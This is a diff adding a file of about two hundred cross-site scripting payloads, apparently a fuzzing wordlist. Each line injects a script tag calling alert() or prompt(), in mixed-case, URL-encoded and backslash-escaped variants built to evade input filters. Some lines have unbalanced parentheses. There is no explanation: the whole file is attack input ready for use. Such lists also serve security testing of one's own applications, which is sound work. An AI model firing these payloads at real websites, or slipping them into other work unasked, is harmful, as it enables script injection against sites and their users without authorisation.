@@ -1,0 +1,200 @@
+<script>alert('Zer0Lulz')</script>
+<ScRiPt>AlErT('XSS')</ScRiPt>
+"><script>alert('XSS')</script>
+"><ScRiPt>AlErT('XSS')</ScRiPt>
+=><><script>alert('XSS')</script>
+=><><ScRiPt>AlErT('XSS')</ScRiPt>
+="><script>alert('XSS')</script>
+="><ScRiPt>AlErT('XSS')</ScRiPt>
+='><script>alert('XSS')</script>
+='><ScRiPt>AlErT('XSS')</ScRiPt>
+="><<script>alert('XSS')</script>
+="><<ScRiPt>AlErT('XSS')</ScRiPt>
+='><<script>alert('XSS')</script>
+='><<ScRiPt>AlErT('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88, 83, 83)</script>
+<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+"><script>alert(String.fromCharCode(88, 83, 83)</script>
+"><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=><><script>alert(String.fromCharCode(88, 83, 83)</script>
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+="><script>alert(String.fromCharCode(88, 83, 83)</script>
+="><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+='><script>alert(String.fromCharCode(88, 83, 83)</script>
+='><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+="><<script>alert(String.fromCharCode(88, 83, 83)</script>
+="><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+='><<script>alert(String.fromCharCode(88, 83, 83)</script>
+='><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+"%3e%3cscript%3ealert('XSS')%3c%2fscript%3e
+"%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript>alert('XSS')%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt>AlErT('XSS')%3c%2fScRiPt%3e
+="%3e%3cscript%3ealert('XSS')%3c%2fscript%3e
+="%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+='%3e%3cscript%3ealert('XSS')%3c%2fscript%3e
+='%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+="%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e
+="%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+='%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e
+='%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e
+\\><script>alert('XSS')</script>
+\\><ScRiPt>AlErT('XSS')</ScRiPt>
+=><><script>alert('XSS')</script>
+=><><ScRiPt>AlErT('XSS')</ScRiPt>
+=\\><script>alert('XSS')</script>
+=\\><ScRiPt>AlErT('XSS')</ScRiPt>
+=\><script>alert('XSS')</script>
+=\><ScRiPt>AlErT('XSS')</ScRiPt>
+=\\><<script>alert('XSS')</script>
+=\\><<ScRiPt>AlErT('XSS')</ScRiPt>
+=\><<script>alert('XSS')</script>
+=\><<ScRiPt>AlErT('XSS')</ScRiPt>
+"%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+"%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript>alert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt>AlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+="%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+="%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+='%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+='%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+="%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+="%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+='%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+='%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+\\><script>alert(String.fromCharCode(88, 83, 83)</script>
+\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=><><script>alert(String.fromCharCode(88, 83, 83)</script>
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\\><script>alert(String.fromCharCode(88, 83, 83)</script>
+=\\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\><script>alert(String.fromCharCode(88, 83, 83)</script>
+=\><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\\><<script>alert(String.fromCharCode(88, 83, 83)</script>
+=\\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\><<script>alert(String.fromCharCode(88, 83, 83)</script>
+=\><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt>
+%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%5c%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%3e%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%5c%3e%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%3e%3c%3cscript%3ealert(%5cXSS%5c)%3c%2fscript%3e
+=%5c%3e%3c%3cScRiPt%3eAlErT(%5cXSS%5c)%3c%2fScRiPt%3e
+%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%3e%3c%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%3e%3c%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+<script>prompt('Zer0Lulz')</script>
+<ScRiPt>PrOmPt('XSS')</ScRiPt>
+"><script>prompt('XSS')</script>
+"><ScRiPt>PrOmPt('XSS')</ScRiPt>
+=><><script>prompt('XSS')</script>
+=><><ScRiPt>PrOmPt('XSS')</ScRiPt>
+="><script>prompt('XSS')</script>
+="><ScRiPt>PrOmPt('XSS')</ScRiPt>
+='><script>prompt('XSS')</script>
+='><ScRiPt>PrOmPt('XSS')</ScRiPt>
+="><<script>prompt('XSS')</script>
+="><<ScRiPt>PrOmPt('XSS')</ScRiPt>
+='><<script>prompt('XSS')</script>
+='><<ScRiPt>PrOmPt('XSS')</ScRiPt>
+<script>prompt(String.fromCharCode(88, 83, 83)</script>
+<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+"><script>prompt(String.fromCharCode(88, 83, 83)</script>
+"><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=><><script>prompt(String.fromCharCode(88, 83, 83)</script>
+=><><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+="><script>prompt(String.fromCharCode(88, 83, 83)</script>
+="><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+='><script>prompt(String.fromCharCode(88, 83, 83)</script>
+='><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+="><<script>prompt(String.fromCharCode(88, 83, 83)</script>
+="><<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+='><<script>prompt(String.fromCharCode(88, 83, 83)</script>
+='><<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+"%3e%3cscript%3eprompt('XSS')%3c%2fscript%3e
+"%3e%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript>prompt('XSS')%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt>PrOmPt('XSS')%3c%2fScRiPt%3e
+="%3e%3cscript%3eprompt('XSS')%3c%2fscript%3e
+="%3e%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+='%3e%3cscript%3eprompt('XSS')%3c%2fscript%3e
+='%3e%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+="%3e%3c%3cscript%3eprompt('XSS')%3c%2fscript%3e
+="%3e%3c%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+='%3e%3c%3cscript%3eprompt('XSS')%3c%2fscript%3e
+='%3e%3c%3cScRiPt%3ePrOmPt('XSS')%3c%2fScRiPt%3e
+\\><script>prompt('XSS')</script>
+\\><ScRiPt>PrOmPt('XSS')</ScRiPt>
+=><><script>prompt('XSS')</script>
+=><><ScRiPt>PrOmPt('XSS')</ScRiPt>
+=\\><script>prompt('XSS')</script>
+=\\><ScRiPt>PrOmPt('XSS')</ScRiPt>
+=\><script>prompt('XSS')</script>
+=\><ScRiPt>PrOmPt('XSS')</ScRiPt>
+=\\><<script>prompt('XSS')</script>
+=\\><<ScRiPt>PrOmPt('XSS')</ScRiPt>
+=\><<script>prompt('XSS')</script>
+=\><<ScRiPt>PrOmPt('XSS')</ScRiPt>
+"%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+"%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript>prompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+="%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+="%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+='%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+='%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+="%3e%3c%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+="%3e%3c%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+='%3e%3c%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+='%3e%3c%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+\\><script>prompt(String.fromCharCode(88, 83, 83)</script>
+\\><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=><><script>prompt(String.fromCharCode(88, 83, 83)</script>
+=><><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\\><script>prompt(String.fromCharCode(88, 83, 83)</script>
+=\\><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\><script>prompt(String.fromCharCode(88, 83, 83)</script>
+=\><ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\\><<script>prompt(String.fromCharCode(88, 83, 83)</script>
+=\\><<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+=\><<script>prompt(String.fromCharCode(88, 83, 83)</script>
+=\><<ScRiPt>PrOmPt(String.fromCharCode(88, 83, 83)</ScRiPt>
+%5c%5c%3e%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+%5c%5c%3e%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%5c%3e%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%5c%5c%3e%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%3e%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%5c%3e%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%5c%3e%3c%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%5c%5c%3e%3c%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+=%5c%3e%3c%3cscript%3eprompt(%5cXSS%5c)%3c%2fscript%3e
+=%5c%3e%3c%3cScRiPt%3ePrOmPt(%5cXSS%5c)%3c%2fScRiPt%3e
+%5c%5c%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+%5c%5c%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%3e%3c%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%3e%3c%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%5c%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%5c%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%3e%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%3e%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%5c%3e%3c%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%5c%3e%3c%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
+=%5c%3e%3c%3cscript%3eprompt(String.fromCharCode(88, 83, 83)%3c%2fscript%3e
+=%5c%3e%3c%3cScRiPt%3ePrOmPt(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e
